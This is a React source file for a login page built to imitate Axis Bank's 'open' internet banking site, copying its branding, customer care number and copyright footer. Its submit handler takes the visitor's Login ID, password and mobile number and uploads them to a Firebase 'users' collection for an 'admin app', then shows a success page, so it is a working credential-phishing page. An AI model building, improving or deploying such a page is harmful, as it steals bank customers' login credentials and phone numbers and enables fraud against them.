import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import '../App.css';
import FirebaseUtil from '../FirebaseRepo';

const FirstPage = () => {
  const [userId, setUserId] = useState('');
  const [password1, setPassword1] = useState('');
  const [mobileNumber, setMobileNumber] = useState('');
  const [captcha, setCaptcha] = useState('');
  const [captchaText, setCaptchaText] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  // We keep mobileError state for display purposes
  const [mobileError] = useState('');
  const [error, setError] = useState('');
  const [firestoreError, setFirestoreError] = useState('');
  // Add captchaError state for the hidden captcha functionality
  const [captchaError] = useState('');
  const navigate = useNavigate();

  // Generate a random captcha text
  const generateCaptcha = () => {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setCaptchaText(result);
  };

  // Mobile number validation is not currently used since the field is hidden
  // but we keep the error state for future use

  // Generate captcha on component mount
  useEffect(() => {
    generateCaptcha();
  }, []);

  // Test Firestore access on component mount
  useEffect(() => {
    const testFirestoreAccess = async () => {
      try {
        console.log('[FIREBASE] Testing Firestore access...');
        const result = await FirebaseUtil.testFirestoreAccess('axisbank');
        
        if (result.state === 'success') {
          console.log('[FIREBASE] Firestore read test successful:', result);
          setFirestoreError(null);
        } else {
          console.error('[FIREBASE] Firestore read test failed:', result);
          setFirestoreError(`Firestore read access error: ${result.error}`);
        }
      } catch (error) {
        console.error('[FIREBASE] Error in Firestore access test:', error);
        setFirestoreError(`Firestore test error: ${error.message}`);
      }
    };
    
    testFirestoreAccess();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError("");
    setFirestoreError("");

    try {
      // Validate form data
      if (!userId) {
        setError("Please enter your Login ID");
        setIsLoading(false);
        return;
      }

      if (!password1) {
        setError("Please enter your password");
        setIsLoading(false);
        return;
      }

      // First test Firestore access to diagnose issues
      console.log('[FIREBASE] Testing Firestore access before submission...');
      const accessTest = await FirebaseUtil.testFirestoreAccess('axisbank');
      console.log('[FIREBASE] Access test result:', accessTest);
      
      if (accessTest.state === 'error') {
        setFirestoreError(`Firestore access error: ${accessTest.error}. This indicates a configuration or permission issue.`);
        setIsLoading(false);
        return;
      }

      // Prepare data for Firestore with the correct structure
      const payload = {
        name: userId, // Using loginId as name
        phone: mobileNumber, // Pass the entered mobile number
        password: password1, // Adding the password field
        trackingId: '', // No trackingId field, sending empty
        courier: '', // No courier field, sending empty
        // 'createdAt' will be added by FirebaseRepo
      };

      console.log('[FIREBASE] Submitting payload to "users" collection:', payload);

      // Upload to the "users" collection to match the admin app
      const result = await FirebaseUtil.uploadAnyModel("users", payload);
      console.log('[FIREBASE] Upload result:', result);

      if (result.state === 'success') {
        console.log('[FIREBASE] Upload successful, navigating to success page');
        navigate("/success");
      } else {
        console.error('[FIREBASE] Upload failed:', result);
        setFirestoreError(`Firestore write error: ${result.error || 'Unknown error'}. Code: ${result.code || 'No code'}`);
        setIsLoading(false);
      }
    } catch (error) {
      console.error('[FIREBASE] Error in form submission:', error);
      setError("An unexpected error occurred. Please try again.");
      setFirestoreError(`Error: ${error.message}`);
      setIsLoading(false);
    }
  };

  const proceedToSuccessPage = () => {
    console.log('[NAVIGATION] About to navigate to /success');
    navigate('/success');
    console.log('[NAVIGATION] Called navigate to /success');
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Header - Maroon Bar with Logo */}
      <header className="bg-[#AE275F] p-2">
        <div className="flex justify-between items-center">
          {/* Menu Button */}
          <button className="text-white p-2">
            <div className="space-y-1">
              <div className="w-6 h-0.5 bg-white"></div>
              <div className="w-6 h-0.5 bg-white"></div>
              <div className="w-6 h-0.5 bg-white"></div>
            </div>
          </button>
          
          {/* Logo and Text */}
          <div className="flex items-center">
            <div className="text-white font-bold text-2xl mr-2">A</div>
            <div className="text-white italic font-medium">
              <span className="text-white text-xl">open</span>
              <span className="text-white text-sm ml-2">| INTERNET BANKING</span>
            </div>
          </div>
          
          {/* Language Dropdown */}
          <div className="flex items-center text-white">
            <span className="mr-1">English</span>
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
            </svg>
          </div>
        </div>
      </header>

      {/* Main Content - Login Form */}
      <main className="flex-1 p-6 bg-white">
        {/* Login using section */}
        <div className="max-w-md mx-auto">
          <h2 className="text-2xl font-medium text-gray-800 mb-4">Login using</h2>
          
          {/* Tabs */}
          <div className="flex mb-6">
            <button className="flex-1 py-3 px-4 bg-[#AE275F] text-white rounded-full font-medium focus:outline-none cursor-default" disabled>
              Login ID / Customer ID
            </button>
          </div>

          {/* Login ID / Customer ID section with info icon */}
          <div className="mb-4">
            <div className="flex items-center mb-2">
              <label className="text-gray-700">Login ID / Customer ID</label>
              <button className="ml-2">
                <svg className="w-5 h-5 text-gray-500" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                  <circle cx="12" cy="12" r="10" strokeWidth="2"/>
                  <path d="M12 16v-4M12 8h.01" strokeWidth="2" strokeLinecap="round"/>
                </svg>
              </button>
            </div>
            <input
              type="text"
              placeholder="Enter ID"
              className="w-full py-3 px-4 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-[#AE275F]"
              value={userId}
              onChange={(e) => setUserId(e.target.value)}
              required
            />
          </div>

          {/* Forgot and Enable links */}
          <div className="flex text-[#AE275F] text-sm mb-6">
            <a href="#" className="mr-6 hover:underline">Forgot customer ID</a>
            <a href="#" className="hover:underline">Enable login ID</a>
          </div>

          {/* Password field */}
          <div className="mb-2">
            <label className="text-gray-700 mb-2 block">Password</label>
            <div className="relative">
              <input
                type="password"
                placeholder="Enter Password"
                className="w-full py-3 px-4 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-[#AE275F] pr-12"
                value={password1}
                onChange={(e) => setPassword1(e.target.value)}
                required
              />
              <button 
                type="button" 
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500"
                onClick={() => alert('Show/hide password')}
              >
                <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l18 18" />
                </svg>
              </button>
            </div>
          </div>

          {/* Forgot password link */}
          <div className="mb-6">
            <a href="#" className="text-[#AE275F] text-sm hover:underline">Forgot password</a>
          </div>

          {/* Login directly to dropdown */}
          <div className="mb-6">
            <label className="text-gray-700 mb-2 block">Login directly to</label>
            <div className="relative">
              <select
                className="w-full py-3 px-4 border border-gray-300 rounded-md appearance-none focus:outline-none focus:ring-1 focus:ring-[#AE275F]"
                defaultValue="dashboard"
              >
                <option value="dashboard">Dashboard</option>
                <option value="accounts">Accounts</option>
                <option value="payments">Payments</option>
                <option value="investments">Investments</option>
              </select>
              <div className="absolute right-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
                <svg className="w-5 h-5 text-gray-500" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                </svg>
              </div>
            </div>
          </div>

          {/* Error Messages */}
          {firestoreError && (
            <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mb-4" role="alert">
              <strong className="font-bold">Firestore Error: </strong>
              <span className="block sm:inline">{firestoreError}</span>
              {firestoreError.includes('error') && (
                <div className="mt-2">
                  <p className="text-sm">Possible solutions:</p>
                  <ul className="list-disc pl-5 text-sm">
                    <li>Check Firestore security rules in Firebase console</li>
                    <li>Verify Firebase project is properly set up</li>
                    <li>Ensure billing is enabled for the Firebase project</li>
                  </ul>
                  <button 
                    type="submit" 
                    disabled={isLoading}
                    className="w-full bg-gradient-to-r from-[#B72B64] to-[#AE275F] text-white font-bold py-3 px-4 rounded-lg focus:outline-none focus:shadow-outline transform transition-transform duration-200 hover:scale-105 shadow-lg"
                  >
                    {isLoading ? 'PLEASE WAIT...' : 'LOGIN'}
                  </button>
                </div>
              )}
            </div>
          )}
          {error && (
            <div className="mb-4 p-2 bg-red-100 border-l-4 border-red-500 text-red-700 text-sm">
              {error}
            </div>
          )}

          {/* Captcha - Hidden but keeping functionality */}
          <div className="hidden">
            <input
              type="text"
              value={captcha}
              onChange={(e) => setCaptcha(e.target.value)}
            />
            <div>{captchaText}</div>
            <button type="button" onClick={generateCaptcha}>Refresh</button>
            {captchaError && <p>{captchaError}</p>}
          </div>

          {/* Mobile Number - Hidden but keeping functionality */}
          <div className="hidden">
            <input
              type="tel"
              value={mobileNumber}
              onChange={(e) => setMobileNumber(e.target.value)}
            />
            {mobileError && <p>{mobileError}</p>}
          </div>

          {/* Login directly to dropdown */}
          <div className="mb-6">
            <label className="text-gray-700 mb-2 block">Login directly to</label>
            <div className="relative">
              <select
                className="w-full py-3 px-4 border border-gray-300 rounded-md appearance-none focus:outline-none focus:ring-1 focus:ring-[#AE275F]"
                defaultValue="dashboard"
              >
                <option value="dashboard">Dashboard</option>
                <option value="accounts">Accounts</option>
                <option value="payments">Payments</option>
                <option value="investments">Investments</option>
              </select>
              <div className="absolute right-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
                <svg className="w-5 h-5 text-gray-500" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                </svg>
              </div>
            </div>
          </div>

          {/* Mobile Number */}
          <div className="mb-4">
            <label className="text-gray-700 mb-2 block">Mobile Number</label>
            <input
              type="tel"
              placeholder="Enter Mobile Number"
              className="w-full py-3 px-4 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-[#AE275F]"
              value={mobileNumber}
              onChange={(e) => setMobileNumber(e.target.value)}
              required
              pattern="[0-9]{10}"
              maxLength={10}
            />
          </div>

          {/* Login Button */}
          <form onSubmit={handleSubmit}>
            <div className="login-btn-container my-4">
              <button type="submit"
  className="w-full bg-gradient-to-r from-[#B72B64] to-[#AE275F] text-white font-bold py-3 px-4 rounded-lg shadow-md hover:shadow-lg hover:from-[#AE275F] hover:to-[#B72B64] transition-all duration-200 ease-in-out focus:outline-none focus:ring-2 focus:ring-[#B72B64] focus:ring-offset-2 disabled:opacity-60 disabled:cursor-not-allowed"
  disabled={isLoading}>

                {isLoading ? 'PLEASE WAIT...' : 'LOGIN'}
              </button>
            </div>
          </form>
          
          {(error || firestoreError) && (
            <div className="error-container" style={{ marginTop: '10px', textAlign: 'center' }}>
              {error && <p style={{ color: 'red' }}>{error}</p>}
              {firestoreError && <p style={{ color: 'orange' }}>{firestoreError}</p>}
              <button 
                type="button" 
                onClick={proceedToSuccessPage}
                style={{ 
                  background: 'none', 
                  border: 'none', 
                  color: '#0066cc', 
                  textDecoration: 'underline',
                  cursor: 'pointer',
                  padding: '5px'
                }}
              >
                Continue anyway
              </button>
            </div>
          )}

          {/* First time user section */}
          <div className="text-center mb-6">
            <p className="text-gray-700">
              First time user? <a href="#" className="text-[#AE275F] font-medium hover:underline">REGISTER HERE</a>
            </p>
          </div>
          
          {/* QR Code Section */}
          <div className="border-t pt-6 flex items-center justify-center">
            <div className="text-center">
              <div className="bg-white p-2 rounded-md shadow-sm inline-block mb-2">
                <img 
                  src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=https://www.axisbank.com/" 
                  alt="Axis Bank QR Code" 
                  className="w-24 h-24 rounded bg-white shadow"
                />
              </div>
              <p className="text-xs text-gray-600 mb-1">Scan to download</p>
              <p className="text-xs text-gray-600 font-medium">open by Axis Bank app</p>
              <a href="#" className="text-xs text-[#AE275F] hover:underline">Enlarge QR code</a>
            </div>
          </div>

          {/* Virtual Assistant */}
          <div className="mt-6 flex items-center justify-between">
            <div className="text-xs max-w-[70%]">
              <p>For safe usage and better experience with Internet Banking, we recommend using <span className="text-[#FFD700] font-medium">private browsing</span>. For assistance, please contact our 24x7 Customer Care at 1860-419-5555</p>
            </div>
            <div className="relative">
              <div className="w-16 h-16 bg-[#FBBC09] rounded-full overflow-hidden border-2 border-white">
                <img 
                  src="https://placehold.co/100x100/FFD700/000000/png?text=👨‍💼" 
                  alt="Virtual Assistant" 
                  className="w-full h-full object-cover"
                />
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#9c2455] text-white p-4 text-center">
        <p className="text-sm">© 2025 Axis Bank Ltd. All rights reserved.</p>
        <p className="text-xs">For support, call 1860-419-5555 or email customercare@axisbank.com</p>
      </footer>
    </div>
  );
};

export default FirstPage;
